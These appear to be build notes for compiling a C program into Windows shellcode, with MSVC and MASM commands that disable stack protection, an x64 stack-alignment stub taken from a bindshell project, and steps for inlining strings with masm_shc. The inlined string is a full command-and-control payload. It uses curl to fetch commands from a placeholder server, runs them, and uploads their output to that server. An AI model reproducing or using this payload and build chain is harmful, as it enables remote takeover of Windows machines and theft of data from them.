FOR x64
1) cmd /k "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\VsDevCmd.bat"
2) "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe" /c /FA /GS- c_shell.cpp
3) "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\ml64.exe" c_shell.asm /link /entry:AlignRSP

For x86
1) cmd /k "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\VsDevCmd.bat"
2) "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx86\x86\cl.exe" /c /FA /GS- c_shell.cpp
3) "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx86\x86\ml.exe" c_shell.asm /link /entry:main

-------------------------------------------------------------------------------------------------------------------------------------------------------------
Syntax error for x32 bit:
ASSUME FS:NOTHING
MOV EAX, FS:[0]
ASSUME FS:ERROR

-------------------------------------------------------------------------------------------------------------------------------------------------------------

Stack alignment set for x64. MUST ADD in x64 versions
; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm

; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
; to calling the entry point of the payload. This is necessary because 64-bit functions
; in Windows assume that they were called with 16-byte stack alignment. When amd64
; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
; alignment.

AlignRSP PROC
    push rsi ; Preserve RSI since we're stomping on it
    mov rsi, rsp ; Save the value of RSP so it can be restored
    and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
    sub rsp, 020h ; Allocate homing space for ExecutePayload
    call main ; Call the entry point of the payload
    mov rsp, rsi ; Restore the original value of RSP
    pop rsi ; Restore RSI
    ret ; Return to caller
AlignRSP ENDP

-------------------------------------------------------------------------------------------------------------------------------------------------------------
For inlining strings: using tool called masm_shc : https://github.com/hasherezade/masm_shc
It automatically inlines, all the strings !!!!
x64
BEFORE:

($SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://your_'
	DB	'url_here.com/shaddy/data.php'') do set output=%i && %i > C:\'
	DB	'users\public\temp.txt && curl --form "fileToUpload=@C:\users\'
	DB	'public\temp.txt" https://your_url_here.com/shaddy/getfile.ph'
	DB	'p" ', 00H
	ORG $+7) DECLARED IN CONST SEGMENT

;Line 26
lea	rax, OFFSET FLAT:$SG90904
mov	QWORD PTR cmd$[rsp], rax


AFTER:

;Line 26
CALL after_$SG90904
$SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://your_'
	DB	'url_here.com/shaddy/data.php'') do set output=%i && %i > C:\'
	DB	'users\public\temp.txt && curl --form "fileToUpload=@C:\users\'
	DB	'public\temp.txt" https://your_url_here.com/shaddy/getfile.ph'
	DB	'p" ', 00H
	ORG $+7
after_$SG90904:
	
POP  rax

; 	lea	rax, OFFSET FLAT:$SG90904
mov	QWORD PTR cmd$[rsp], rax
